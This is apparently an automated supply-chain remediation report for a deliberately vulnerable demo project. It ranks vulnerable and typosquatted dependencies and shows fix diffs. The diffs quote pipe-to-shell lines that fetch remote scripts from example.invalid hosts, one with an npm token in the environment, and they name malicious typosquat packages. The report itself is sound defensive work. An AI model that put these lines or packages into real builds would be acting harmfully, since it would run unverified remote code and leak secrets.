# Guardian remediation report: sscg-demo-target

*Run `d7c35427f51d` · 2026-11-24T03:48:35+00:00 · engine rules-fallback (no LLM)*

**Prioritized risk → Recommended fix → Human approval → Build & test → Rescan → Verification: partially verified**

## 1. Summary

- **Verdict:** 🟨 **partially verified** (confidence low)
  - 1 package(s) moved to a version that still has advisories: org.apache.logging.log4j:log4j-api@2.25.4
  - some steps fail before and after the fix (not caused by it): after: npm ci (.), after: pip install -r requirements.txt (worker)
- **Findings:** 41 before → 36 after · resolved 6 · new 1
- **Proposals:** 20 · approved 2 · pending 18
- **Patch:** `C:\Users\VICTUS\Desktop\Bosch Hack\sscg\out\sscg-demo-target\day2\remediation.patch`

## 2. Prioritized risks

*Day 1 initial risk + signed points for exploitability (CISA KEV, EPSS), reachability, exposure and the triage verdict. Deterministic: the same input gives the same order.*

| Priority | Score | Finding | Component | Why | Confidence |
|---|---|---|---|---|---|
| P0 🔥 | 14.5 | F-007 org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (h | org.apache.logging.log4j:log4j-core@2.14.1 | listed in CISA KEV: exploited in the wild, used in ransomware (+2.5); EPSS 1.000 for CVE-2021-45105 (100% percentile) (+1); imported by application code (notifier/src/main/java/com/acme/Notifier.java:2, notifier/src/main | high |
| P0 🔥 | 10.0 | F-004 crossenv@7.0.3 is a documented malicious package | crossenv@7.0.3 | install-time risk: runs on every install, whether or not code imports it | high |
| P0 🔥 | 10.0 | F-005 lodash@4.17.15: same version, different content hash (and source) in p | lodash@4.17.15 | install-time risk: runs on every install, whether or not code imports it | high |
| P0 🔥 | 10.0 | F-006 python3-dateutil@2.8.1 is a documented malicious package | python3-dateutil@2.8.1 | install-time risk: runs on every install, whether or not code imports it | high |
| P0 🔥 | 10.0 | F-012 'crossenv' looks like the popular package 'cross-env' | crossenv@7.0.3 | install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1) | high |
| P0 🔥 | 10.0 | F-013 'python3-dateutil' looks like the popular package 'python-dateutil' | python3-dateutil@2.8.1 | install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1) | high |
| P0 🔥 | 10.0 | F-021 lodash@4.17.15: lockfile entry changed (resolved, integrity) but packa | lodash@4.17.15 | install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, medium confidence (AI inference) (+1) | high |
| P0 🔥 | 7.5 | F-033 new dev dependency crossenv@7.0.3 added in package.json | crossenv@7.0.3 | triage: likely malicious, high confidence (AI inference) (+1) | high |
| P0 🔥 | 7.5 | F-034 new prod dependency python3-dateutil@2.8.1 added in worker/requirement | python3-dateutil@2.8.1 | triage: likely malicious, high confidence (AI inference) (+1) | high |
| P0 🔥 | 5.0 | F-041 crossenv@7.0.3 runs an install script (code not inspected) | crossenv@7.0.3 | install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1) | high |
| P0 | 10.8 | F-011 pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8) | pyyaml@5.3.0 | EPSS 0.062 for CVE-2020-14343 (94% percentile); imported by application code (worker/app.py:3) (+0.5); shipped in a network-facing service (+0.5) | high |
| P0 | 10.5 | F-001 'postinstall' script scripts/setup.js runs shell commands / child proc | - | install-time risk: runs on every install, whether or not code imports it; triage: suspicious, medium confidence (AI inference) (+0.5) | high |
| P1 | 10.3 | F-009 minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8) | minimist@0.0.8 | EPSS 0.046 for CVE-2021-44906 (92% percentile); pulled in by an imported dependency (potentially reachable); shipped in a network-facing service (+0.5) | high |
| P1 | 10.1 | F-023 axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6) | axios@0.21.0 | EPSS 0.123 for CVE-2026-44492 (96% percentile) (+0.5); imported by application code (src/index.js:4) (+0.5); shipped in a network-facing service (+0.5) | high |
| P1 | 10.0 | F-002 .github/workflows/ci.yml: 'pull_request_target' workflow checks out th | - |  | high |
| P1 | 10.0 | F-003 .github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a download | - |  | high |
| P1 | 9.6 | F-024 jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6) | jinja2@2.10.0 | EPSS 0.036 for CVE-2019-10906 (90% percentile); imported by application code (worker/app.py:4) (+0.5); shipped in a network-facing service (+0.5) | high |
| P1 | 9.6 | F-025 lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1) | lodash@4.17.15 | EPSS 0.202 for CVE-2021-23337 (98% percentile) (+0.5); imported by application code (src/index.js:3) (+0.5); shipped in a network-facing service (+0.5) | high |
| P1 | 9.5 | F-018 first-time contributor fastbuilds42 changed 6 build/dependency files i | - | triage: suspicious, high confidence (AI inference) (+0.5) | high |
| P1 | 9.5 | F-019 image fastbuilds42/node:latest is not an official / verified-publisher | fastbuilds42/node:latest | triage: suspicious, high confidence (AI inference) (+0.5) | high |
| | | *21 more in day2.json* | | | |

## 3. Recommended fixes and decisions

### P-001 · ✅ approved · upgrade · org.apache.logging.log4j:log4j-core@2.14.1

- **Findings:** F-007 org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL, CVS
- **Change:** 2.14.1 → 2.25.4 in `notifier/pom.xml`
- **Why (verified facts):** Upgrade org.apache.logging.log4j:log4j-core 2.14.1 -> 2.25.4: fixes the 8 published advisories on 2.14.1; no known advisories remain on the target.
- **Advisor (AI inference):** P-001 upgrades org.apache.logging.log4j:log4j-core from 2.14.1 to 2.25.4, which addresses the 8 published advisories in F-007, including the highest CRITICAL CVSS 10.0 finding, and the packet records no residual advisories on the target. The trade-off is medium compatibility risk from the minor version change 2.14.1 -> 2.25.4, so validation should focus on logging behavior and dependency resolution.
- **Reviewer checklist (AI):** Verify notifier/pom.xml sets log4j.version to 2.25.4 and that the build resolves log4j-core 2.25.4, not 2.14.1. · Run the notifier build and tests under the configured Java 11 compiler settings to catch logging API or runtime compatibility issues. · Confirm no residual log4j-core 2.14.1 reference remains in the lockfile or dependency tree.
- **Expected risk reduction:** 8 of 8 advisories fixed; resolves 1 finding(s)
- **Compatibility:** medium: minor version change (2.14.1 -> 2.25.4)
- **Rollback:** restore org.apache.logging.log4j:log4j-core 2.14.1 in notifier/pom.xml (and the lockfile) by reverting the remediation commit
- **Decision:** approve by admin at 2026-11-24T03:48:09+00:00: Approved P-001 to P-004 (critical CVEs and malicious typosquats). Reviewing the rest after the sandbox rescan.
- **Validation:** resolved (1/1 findings gone after the rescan)

```diff
--- a/notifier/pom.xml
+++ b/notifier/pom.xml
@@ -11,7 +11,7 @@
   <properties>
     <maven.compiler.source>11</maven.compiler.source>
     <maven.compiler.target>11</maven.compiler.target>
-    <log4j.version>2.14.1</log4j.version>
+    <log4j.version>2.25.4</log4j.version>
   </properties>
 
   <dependencies>
```

### P-002 · ⏳ pending · replace · crossenv@7.0.3

- **Findings:** F-004 crossenv@7.0.3 is a documented malicious package; F-012 'crossenv' looks like the popular package 'cross-env'; F-033 new dev dependency crossenv@7.0.3 added in package.json; F-041 crossenv@7.0.3 runs an install script (code not inspected)
- **Change:** 7.0.3 → cross-env@10.1.0 in `package.json`
- **Why (verified facts):** crossenv@7.0.3 is a documented malicious package of 'cross-env'; replace it with cross-env@10.1.0.
- **Advisor (AI inference):** P-002 replaces crossenv@7.0.3 with cross-env@10.1.0 because F-004 and F-012 identify crossenv as a documented malicious typosquat of cross-env, while F-033 and F-041 flag the unexpected dev dependency and its install script. The trade-off is low compatibility risk per the packet because crossenv is not imported by application code, but the package-lock must be regenerated from the registry during validation.
- **Reviewer checklist (AI):** Confirm package.json no longer contains crossenv@7.0.3 and instead declares cross-env@^10.1.0. · Check the regenerated package-lock.json for removal of crossenv and its install-script entry, and verify cross-env resolves from the registry. · Run npm install and the dev/build scripts in CI to confirm any tooling that expected the crossenv command still works with cross-env.
- **Expected risk reduction:** removes the malicious / typosquatted package and its install-time code; resolves 4 finding(s)
- **Compatibility:** low: crossenv is not imported by application code
- **Rollback:** do NOT roll back to the removed package; revert only if the replacement breaks the build
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/package.json
+++ b/package.json
@@ -15,6 +15,6 @@
   },
   "license": "MIT",
   "devDependencies": {
-    "crossenv": "7.0.3"
+    "cross-env": "^10.1.0"
   }
 }
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-003 · ✅ approved · upgrade · lodash@4.17.15

- **Findings:** F-005 lodash@4.17.15: same version, different content hash (and source) in package-lock.json; F-020 lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry; F-021 lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks f; F-025 lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1)
- **Change:** 4.17.15 → 4.18.1 in `package.json`
- **Why (verified facts):** Upgrade lodash 4.17.15 -> 4.18.1: fixes the 5 published advisories on 4.17.15; no known advisories remain on the target. Regenerating the lockfile from the official registry also undoes the lockfile tampering.
- **Advisor (AI inference):** P-003 upgrades lodash from 4.17.15 to 4.18.1, addressing the 5 known vulnerabilities in F-025 and also undoing the lockfile tampering described by F-005, F-020, and F-021 when the lockfile is regenerated from the official registry. The trade-off is medium compatibility risk from the minor version change 4.17.15 -> 4.18.1, with no residual advisories reported on the target.
- **Reviewer checklist (AI):** Verify package.json pins lodash to 4.18.1 and that the regenerated package-lock.json no longer resolves lodash from npm-mirror.example.invalid. · Check the lockfile entry for lodash@4.18.1 has expected registry resolution and integrity metadata, with no remaining 4.17.15 tampered entry. · Run application tests that exercise lodash usage to catch behavioral changes from the minor upgrade.
- **Expected risk reduction:** 5 of 5 advisories fixed; resolves 4 finding(s)
- **Compatibility:** medium: minor version change (4.17.15 -> 4.18.1)
- **Rollback:** restore lodash 4.17.15 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** approve by admin at 2026-11-24T03:48:09+00:00: Approved P-001 to P-004 (critical CVEs and malicious typosquats). Reviewing the rest after the sandbox rescan.
- **Validation:** resolved (4/4 findings gone after the rescan)

```diff
--- a/package.json
+++ b/package.json
@@ -9,7 +9,7 @@
   },
   "dependencies": {
     "axios": "0.21.0",
-    "lodash": "4.17.15",
+    "lodash": "4.18.1",
     "mkdirp": "0.5.1",
     "node-fetch": "2.6.0"
   },
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-004 · ⏳ pending · replace · python3-dateutil@2.8.1

- **Findings:** F-006 python3-dateutil@2.8.1 is a documented malicious package; F-013 'python3-dateutil' looks like the popular package 'python-dateutil'; F-034 new prod dependency python3-dateutil@2.8.1 added in worker/requirements.txt
- **Change:** 2.8.1 → python-dateutil@4.0.0 in `worker/requirements.txt`
- **Why (verified facts):** python3-dateutil@2.8.1 is a documented malicious package of 'python-dateutil'; replace it with python-dateutil@4.0.0.
- **Advisor (AI inference):** P-004 replaces python3-dateutil@2.8.1 with python-dateutil@4.0.0 because F-006 and F-013 identify python3-dateutil as a documented malicious typosquat of python-dateutil, and F-034 flags it as an unexpected production dependency. The trade-off is low compatibility risk per the packet because python3-dateutil is not imported by application code, and rollback should not restore the malicious package.
- **Reviewer checklist (AI):** Confirm worker/requirements.txt contains python-dateutil==4.0.0 and no longer contains python3-dateutil==2.8.1. · Search application code and worker requirements for any remaining python3-dateutil references before deploying. · Build and test the worker environment to confirm the replacement package installs and the service starts without the removed dependency.
- **Expected risk reduction:** removes the malicious / typosquatted package and its install-time code; resolves 3 finding(s)
- **Compatibility:** low: python3-dateutil is not imported by application code
- **Rollback:** do NOT roll back to the removed package; revert only if the replacement breaks the build
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/worker/requirements.txt
+++ b/worker/requirements.txt
@@ -1,5 +1,5 @@
 requests==2.19.1
 PyYAML==5.3
 Jinja2==2.10
-python3-dateutil==2.8.1
+python-dateutil==4.0.0
 urllib3
```

### P-005 · ⏳ pending · upgrade · pyyaml@5.3.0

- **Findings:** F-011 pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Change:** 5.3.0 → 6.0.1 in `worker/requirements.txt`
- **Why (verified facts):** Pin pyyaml 5.3.0 -> 6.0.1: fixes the 2 published advisories on 5.3.0; no known advisories remain on the target.
- **Advisor (AI inference):** P-005 upgrades PyYAML from 5.3.0 to 6.0.1, addressing the 2 known vulnerabilities in F-011, including the highest CRITICAL CVSS 9.8 finding, with no residual advisories reported on the target. The trade-off is high compatibility risk from the major version change 5.3.0 -> 6.0.1, so the worker tests and YAML loading paths need validation.
- **Reviewer checklist (AI):** Verify worker/requirements.txt pins PyYAML==6.0.1 and that the lockfile no longer resolves 5.3.0. · Run the worker test suite and startup checks to catch PyYAML major-version API or behavior changes. · Review YAML parsing call sites for compatibility with PyYAML 6.0.1, especially any use of loaders or legacy YAML behaviors.
- **Expected risk reduction:** 2 of 2 advisories fixed; resolves 1 finding(s)
- **Compatibility:** high: major version change (5.3.0 -> 6.0.1): breaking API changes are possible, run the tests
- **Rollback:** restore pyyaml 5.3.0 in worker/requirements.txt (and the lockfile) by reverting the remediation commit
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/worker/requirements.txt
+++ b/worker/requirements.txt
@@ -1,5 +1,5 @@
 requests==2.19.1
-PyYAML==5.3
+PyYAML==6.0.1
 Jinja2==2.10
 python3-dateutil==2.8.1
 urllib3
```

### P-006 · ⏳ pending · block · package.json scripts.postinstall

- **Findings:** F-001 'postinstall' script scripts/setup.js runs shell commands / child processes, reads secrets; F-031 acme-orders@1.0.0 runs a 'postinstall' script on every install: node scripts/setup.js
- **Change:** - → - in `package.json`
- **Why (verified facts):** Remove the 'postinstall' hook from package.json: it runs code that reads secrets on every install (including CI). Review and delete the script file it calls.
- **Advisor (AI inference):** P-006 blocks the package.json scripts.postinstall hook, which F-001 and F-031 describe as running scripts/setup.js on every install, including CI, with behavior that reads secrets, hides data with base64, and runs shell commands. The trade-off is medium compatibility risk because any legitimate setup previously performed by postinstall must now be done explicitly.
- **Reviewer checklist (AI):** Confirm package.json no longer defines scripts.postinstall and that scripts.start remains intact. · Review and delete or remediate scripts/setup.js so the unsafe install behavior cannot be reintroduced accidentally. · Check CI and developer setup documentation for any dependency on the removed postinstall step and perform required setup explicitly.
- **Expected risk reduction:** stops install-time code execution; resolves 2 finding(s)
- **Compatibility:** medium: anything the 'postinstall' step legitimately prepared must now be done explicitly
- **Rollback:** restore scripts.postinstall in package.json after a security review
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/package.json
+++ b/package.json
@@ -4,8 +4,7 @@
   "description": "Order API (SSCG demo target - do not install)",
   "main": "src/index.js",
   "scripts": {
-    "start": "node src/index.js",
-    "postinstall": "node scripts/setup.js"
+    "start": "node src/index.js"
   },
   "dependencies": {
     "axios": "0.21.0",
```

### P-007 · ⏳ pending · upgrade · minimist@0.0.8

- **Findings:** F-009 minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)
- **Change:** 0.0.8 → 0.2.4 in `package.json`
- **Why (verified facts):** Override the transitive copies minimist 0.0.8 -> 0.2.4: fixes the 2 published advisories on 0.0.8; no known advisories remain on the target.
- **Advisor (AI inference):** P-007 replaces the transitive minimist@0.0.8 with a package.json override to 0.2.4, which clears the two advisories (highest CRITICAL, CVSS 9.8) reported in F-009, and the target has no residual advisories. The trade-off is a minor-version jump (0.0.8 -> 0.2.4) on a transitive dependency that other packages may rely on, so the compatibility risk is medium even though the diff is small. Rollback is a simple revert of the override and lockfile commit if consumers break.
- **Reviewer checklist (AI):** Run the full test suite and any CLI/argument-parsing paths that consume minimist transitively to confirm 0.2.4 behaves identically. · Verify in the regenerated package-lock.json that no nested copy of minimist 0.0.8 survives the override. · Confirm the override block in package.json applies to the intended dependency tree and does not mask a direct dependency version pin.
- **Expected risk reduction:** 2 of 2 advisories fixed; resolves 1 finding(s)
- **Compatibility:** medium: minor version change (0.0.8 -> 0.2.4)
- **Rollback:** restore minimist 0.0.8 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/package.json
+++ b/package.json
@@ -16,5 +16,8 @@
   "license": "MIT",
   "devDependencies": {
     "crossenv": "7.0.3"
+  },
+  "overrides": {
+    "minimist": "0.2.4"
   }
 }
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-008 · ⏳ pending · upgrade · axios@0.21.0

- **Findings:** F-023 axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6)
- **Change:** 0.21.0 → 0.34.0 in `package.json`
- **Why (verified facts):** Upgrade axios 0.21.0 -> 0.34.0: fixes the 25 published advisories on 0.21.0; no known advisories remain on the target.
- **Advisor (AI inference):** P-008 upgrades the direct dependency axios from 0.21.0 to 0.34.0, removing the 25 advisories listed in F-023 (highest HIGH, CVSS 8.6) with no residual advisories on the target. Because axios is direct and used at runtime, the minor-version change carries medium compatibility risk across request/response and interceptor behavior. The change is confined to package.json plus a regenerated lockfile, so rollback is a clean revert.
- **Reviewer checklist (AI):** Exercise the application's HTTP call sites (timeouts, interceptors, error handling) against axios 0.34.0 to catch behavior changes. · Verify the lockfile regenerated cleanly and that no other dependency still pins a vulnerable axios copy. · Check the affected service end-to-end in a staging environment before production rollout.
- **Expected risk reduction:** 25 of 25 advisories fixed; resolves 1 finding(s)
- **Compatibility:** medium: minor version change (0.21.0 -> 0.34.0)
- **Rollback:** restore axios 0.21.0 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/package.json
+++ b/package.json
@@ -8,7 +8,7 @@
     "postinstall": "node scripts/setup.js"
   },
   "dependencies": {
-    "axios": "0.21.0",
+    "axios": "0.34.0",
     "lodash": "4.17.15",
     "mkdirp": "0.5.1",
     "node-fetch": "2.6.0"
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

### P-009 · ⏳ pending · escalate review · .github/workflows/ci.yml

- **Findings:** F-002 .github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's own
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Do not check out the pull request's code in a pull_request_target workflow; use the pull_request trigger, or split into an unprivileged build and a privileged workflow_run.
- **Expected risk reduction:** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** use pull_request instead, or never check out PR head in pull_request_target
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

### P-010 · ⏳ pending · escalate review · .github/workflows/ci.yml

- **Findings:** F-003 .github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Stop passing the secret to downloaded / mutable code (see the related proposals) and rotate the secret: it may already be exposed.
- **Expected risk reduction:** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** pin the action / verify the script; rotate the secret if the workflow has run
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

### P-011 · ⏳ pending · upgrade · jinja2@2.10.0

- **Findings:** F-024 jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6)
- **Change:** 2.10.0 → 3.1.6 in `worker/requirements.txt`
- **Why (verified facts):** Pin jinja2 2.10.0 -> 3.1.6: fixes the 6 published advisories on 2.10.0; no known advisories remain on the target.
- **Advisor (AI inference):** P-011 pins Jinja2 from 2.10.0 to 3.1.6 in worker/requirements.txt, clearing the 6 advisories in F-024 (highest HIGH, CVSS 8.6) with no residual advisories on the target. This is a major-version change (2.x -> 3.x) with known breaking API changes, so compatibility risk is high and test coverage is the main safeguard. The edit is a one-line pin plus lockfile, making rollback straightforward via revert.
- **Reviewer checklist (AI):** Run the worker's template-rendering tests and manually render representative templates for Jinja2 3.x API/filter deprecations. · Check that no other Python dependency in worker/requirements.txt constrains Jinja2 below 3.1.6 or conflicts with MarkupSafe version requirements. · Confirm the worker's error paths for template failures still behave as expected after the upgrade.
- **Expected risk reduction:** 6 of 6 advisories fixed; resolves 1 finding(s)
- **Compatibility:** high: major version change (2.10.0 -> 3.1.6): breaking API changes are possible, run the tests
- **Rollback:** restore jinja2 2.10.0 in worker/requirements.txt (and the lockfile) by reverting the remediation commit
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/worker/requirements.txt
+++ b/worker/requirements.txt
@@ -1,5 +1,5 @@
 requests==2.19.1
 PyYAML==5.3
-Jinja2==2.10
+Jinja2==3.1.6
 python3-dateutil==2.8.1
 urllib3
```

### P-012 · ⏳ pending · escalate review · 

- **Findings:** F-018 first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e ("chore: r
- **Change:** - → -
- **Why (verified facts):** first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e ("chore: routine dependency refresh"). Require a second reviewer for build and dependency files from this author; the other proposals address the concrete changes.
- **Expected risk reduction:** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** process change, nothing to patch
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

### P-013 · ⏳ pending · update base image · fastbuilds42/node:latest

- **Findings:** F-019 image fastbuilds42/node:latest is not an official / verified-publisher image (docker.io/fa; F-032 image fastbuilds42/node:latest uses a mutable tag and no digest
- **Change:** latest → node:lts-slim@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc in `Dockerfile`
- **Why (verified facts):** Use the official Docker Hub image docker.io/library/node:lts-slim, pinned by digest, instead of fastbuilds42/node:latest (unverified publisher, mutable tag).
- **Advisor (AI inference):** P-013 replaces the unverified fastbuilds42/node:latest image with the official docker.io/library/node:lts-slim pinned by digest, directly addressing the untrusted-publisher finding F-019 and the mutable-tag/no-digest finding F-032. Pinning by digest makes the runtime image immutable and auditable, at the cost of a medium-compatibility base-image change (runtime version and OS packages). Rollback restores the original FROM line but is not recommended since it reintroduces both findings.
- **Reviewer checklist (AI):** Build the image and run the container's smoke tests to confirm the lts-slim runtime version and available OS packages satisfy application needs. · Verify the pinned digest sha256:e6bedef2... resolves to the expected official node:lts-slim image and record it for future update tracking. · Confirm application code and any native addons work on the slim variant, which omits build tooling present in full images.
- **Expected risk reduction:** resolves 2 finding(s); the image can no longer change silently
- **Compatibility:** medium: the runtime base image changes: check the language runtime version and OS packages
- **Rollback:** restore 'FROM fastbuilds42/node:latest' (not recommended)
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,4 +1,4 @@
-FROM docker.io/fastbuilds42/node:latest
+FROM docker.io/library/node:lts-slim@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc
 WORKDIR /app
 COPY . .
 RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh
```

### P-014 · ⏳ pending · upgrade · org.apache.commons:commons-text@1.9

- **Findings:** F-010 org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8)
- **Change:** 1.9 → 1.10.0 in `notifier/pom.xml`
- **Why (verified facts):** Upgrade org.apache.commons:commons-text 1.9 -> 1.10.0: fixes the 1 published advisories on 1.9; no known advisories remain on the target.
- **Advisor (AI inference):** P-014 upgrades the direct Java dependency org.apache.commons:commons-text from 1.9 to 1.10.0, resolving the single CRITICAL advisory (CVSS 9.8) in F-010 with no residual advisories on the target. The minor-version change in notifier/pom.xml has medium compatibility risk for string-manipulation behavior consumers rely on. The edit is limited to the pom version element plus lockfile, so a revert fully restores the prior state.
- **Reviewer checklist (AI):** Run the notifier module's unit and integration tests, especially any tests exercising commons-text string substitution and escaping. · Rebuild notifier/pom.xml to confirm dependency resolution succeeds and no other Jackson/commons dependency conflicts with 1.10.0. · Confirm the effective dependency tree no longer contains commons-text 1.9 via any transitive path.
- **Expected risk reduction:** 1 of 1 advisories fixed; resolves 1 finding(s)
- **Compatibility:** medium: minor version change (1.9 -> 1.10.0)
- **Rollback:** restore org.apache.commons:commons-text 1.9 in notifier/pom.xml (and the lockfile) by reverting the remediation commit
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/notifier/pom.xml
+++ b/notifier/pom.xml
@@ -23,7 +23,7 @@
     <dependency>
       <groupId>org.apache.commons</groupId>
       <artifactId>commons-text</artifactId>
-      <version>1.9</version>
+      <version>1.10.0</version>
     </dependency>
     <dependency>
       <groupId>com.fasterxml.jackson.core</groupId>
```

### P-015 · ⏳ pending · block · .github/workflows/ci.yml

- **Findings:** F-014 .github/workflows/ci.yml: job 'build' downloads a script and pipes it into a shell
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Disable the download-and-execute step in .github/workflows/ci.yml: its content can change at any time and is not verified.
- **Advisor (AI inference):** P-015 disables the CI step in .github/workflows/ci.yml that pipes a remote script into a shell, addressing the unsafe-install-script finding F-014 by removing execution of unverified, mutable remote content. The trade-off is medium: whatever the script provisioned is no longer performed, so the build may need a vetted replacement (download, verify a pinned checksum or signature, then run). Rollback is intentionally gated on adding checksum verification.
- **Reviewer checklist (AI):** Confirm the commented-out step is not required for CI to pass and identify what the script previously set up. · If the functionality is still needed, verify the replacement step downloads a pinned artifact and validates a checksum or signature before execution. · Check that CI secrets such as NPM_TOKEN are not exposed to any remaining or replacement step that runs untrusted code.
- **Expected risk reduction:** resolves 1 finding
- **Compatibility:** medium: whatever the script set up is no longer done
- **Rollback:** re-enable only with a checksum check
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -19,6 +19,7 @@
           node-version: 18
       - uses: fastbuilds42/cache-helper@main
       - run: npm install
-      - run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash
+      # SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it.
+      # - run: curl -fsSL http://get.example.invalid/ci-agent.sh | bash
         env:
           NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

### P-016 · ⏳ pending · block · fastbuilds42/cache-helper

- **Findings:** F-015 .github/workflows/ci.yml: third-party action 'fastbuilds42/cache-helper@main' is not pinne
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** The action fastbuilds42/cache-helper could not be resolved on GitHub (missing or private): remove this step from .github/workflows/ci.yml or replace it with a trusted action.
- **Expected risk reduction:** -
- **Compatibility:** low: -
- **Rollback:** -
- **Notes:** removing a workflow step needs a human: later steps may depend on it
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

### P-017 · ⏳ pending · mitigate · .github/workflows/ci.yml

- **Findings:** F-016 .github/workflows/ci.yml: workflow token has 'permissions: write-all'
- **Change:** - → - in `.github/workflows/ci.yml`
- **Why (verified facts):** Reduce the workflow token in .github/workflows/ci.yml from write-all to read-all; grant write permissions per job only where needed.
- **Advisor (AI inference):** P-017 mitigates F-016 by changing the workflow token from write-all to read-all, removing the broad write permission flagged in .github/workflows/ci.yml. The trade-off is medium compatibility risk: jobs that push, release, or comment will need explicit per-job write permissions. Rollback is to restore 'permissions: write-all' if the safer default cannot be made to work.
- **Reviewer checklist (AI):** Confirm every job in .github/workflows/ci.yml still succeeds with read-all as the default workflow permission. · Identify any job that pushes, releases, or comments and verify it has an explicit, minimal per-job write permission where needed. · Review the pull_request_target trigger context to confirm the reduced token cannot be escalated unintentionally.
- **Expected risk reduction:** resolves 1 finding
- **Compatibility:** medium: jobs that push, release or comment need an explicit per-job permission
- **Rollback:** restore 'permissions: write-all'
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -5,7 +5,7 @@
     branches: [main]
   pull_request_target:
 
-permissions: write-all
+permissions: read-all
 
 jobs:
   build:
```

### P-018 · ⏳ pending · block · Dockerfile

- **Findings:** F-017 Dockerfile downloads a script and pipes it into a shell
- **Change:** - → - in `Dockerfile`
- **Why (verified facts):** Disable the download-and-execute step in Dockerfile: its content can change at any time and is not verified.
- **Advisor (AI inference):** P-018 blocks F-017 by disabling the Dockerfile step that downloads and pipes an unverified remote script into a shell, removing a download-and-execute path whose content can change over time. The trade-off is medium compatibility risk because whatever the script previously set up will no longer run during image builds. Rollback should re-enable the step only with a pinned checksum or signature verification.
- **Reviewer checklist (AI):** Build the Docker image and confirm the remaining steps, including 'npm install' and the application start command, complete successfully without the disabled script. · Determine what the bootstrap script previously configured and confirm an equivalent verified setup is either unnecessary or supplied through a pinned, checksum-verified replacement. · Inspect the Dockerfile to confirm the download-and-execute line remains disabled and no equivalent unverified remote execution was added.
- **Expected risk reduction:** resolves 1 finding
- **Compatibility:** medium: whatever the script set up is no longer done
- **Rollback:** re-enable only with a checksum check
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,7 +1,8 @@
 FROM docker.io/fastbuilds42/node:latest
 WORKDIR /app
 COPY . .
-RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh
+# SSCG: disabled unverified remote script. Download it, verify a pinned checksum or signature, then run it.
+# RUN curl -fsSL http://get.example.invalid/bootstrap.sh | sh
 RUN npm install
 EXPOSE 3000
 CMD ["node", "src/index.js"]
```

### P-019 · ⏳ pending · upgrade · com.fasterxml.jackson.core:jackson-databind@2.9.8

- **Findings:** F-008 com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest CRITI
- **Change:** 2.9.8 → 2.18.11 in `notifier/pom.xml`
